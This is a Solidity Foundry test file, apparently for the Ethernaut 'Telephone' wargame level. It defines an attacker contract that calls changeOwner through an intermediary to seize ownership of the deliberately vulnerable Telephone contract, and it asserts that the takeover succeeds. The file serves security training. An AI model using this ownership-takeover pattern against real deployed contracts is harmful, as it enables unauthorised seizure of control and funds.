
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone.sol";
import {DeployTelephone} from "../script/DeployTelephone.s.sol";

contract TelephoneTest is Test {

    Telephone telephone;
    DeployTelephone deployer;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");

    function setUp() external {
        deployer = new DeployTelephone();
        telephone = deployer.run();
    }

    function testOwner() external view {
        assertEq(telephone.owner(), owner);
    }

    function testTakeOverTheOwnership() external {
        vm.startPrank(owner);
        assertEq(telephone.owner(), owner);
        console2.log("Owner Address: ", owner);
        console2.log("Attacker Address: ", attacker);
        vm.stopPrank();

        vm.startPrank(attacker);
        console2.log("Telephone Contract Owner Before the Attack: ", telephone.owner());
        AttackerContract attackerContract = new AttackerContract(telephone);
        attackerContract.takeOwnershipAttack(attacker);
        console2.log("Telephone Contract Owner After the Attack: ", telephone.owner());
        vm.stopPrank();
        assertEq(attacker, telephone.owner());
    }

}

contract AttackerContract {

    Telephone telephone;

    constructor(Telephone _telephone) {
        telephone = _telephone;
    }

    function takeOwnershipAttack(address _newOwner) external {
        telephone.changeOwner(_newOwner);
    }

}